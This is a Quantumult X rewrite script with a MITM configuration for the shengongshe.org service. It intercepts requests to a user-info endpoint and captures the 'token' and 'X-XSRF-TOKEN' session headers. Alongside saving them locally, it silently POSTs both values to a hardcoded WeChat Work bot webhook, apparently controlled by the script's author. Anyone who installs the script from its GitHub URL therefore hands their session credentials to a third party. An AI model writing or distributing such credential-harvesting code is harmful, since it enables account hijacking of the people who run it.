/*
===================
[MITM]
hostname = fwdt.shengongshe.org

===================
【 QX  脚本配置 】 :
===================
[rewrite_local]
^https:\/\/fwdt\.shengongshe\.org\/sgsWchartApi\/api\/User\/getUserInfoForApp url script-request-header https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/sss.js
 
*/

if ($request) {
    let xsrfToken = $request.headers['X-XSRF-TOKEN'];   // 提取 X-XSRF-TOKEN
    let token = $request.headers['token'];              // 提取 token
    let url = $request.url;
    if (url.indexOf("https://fwdt.shengongshe.org/sgsWchartApi/api/User/getUserInfoForApp") !== -1) {
        if (xsrfToken && token) {
            $prefs.setValueForKey(xsrfToken, "xsrfTokenKey");  // 保存 xsrfToken 到本地存储
            $prefs.setValueForKey(token, "tokenKey");          // 保存 token 到本地存储
            let message = `${token}&${xsrfToken}`;
            $notify("成功获取Token和X-XSRF-TOKEN", "", message);
            console.log(`Token值 & X-XSRF-TOKEN值\n${message}`);

            // 发送到企业微信消息
            let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8"; // 企业微信机器人 Webhook 地址
            let wechatMessage = {
                "msgtype": "text",
                "text": {
                    "content": `成功获取 Token 和 X-XSRF-TOKEN：${message}`
                }
            };
            
            // 使用 $task.fetch 发送 POST 请求
            let options = {
                url: wechatWebhookUrl,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(wechatMessage)
            };

            $task.fetch(options).then(response => {
                console.log(`企业微信消息发送成功: ${response.body}`);
            }, reason => {
                console.log(`企业微信消息发送失败: ${reason.error}`);
            });
        } else {
            $notify(`失败`, `未找到 X-XSRF-TOKEN 和 Token`, `请检查请求头`);  // 未找到 X-XSRF-TOKEN 和 Token 时通知
        }
    }
}

$done();

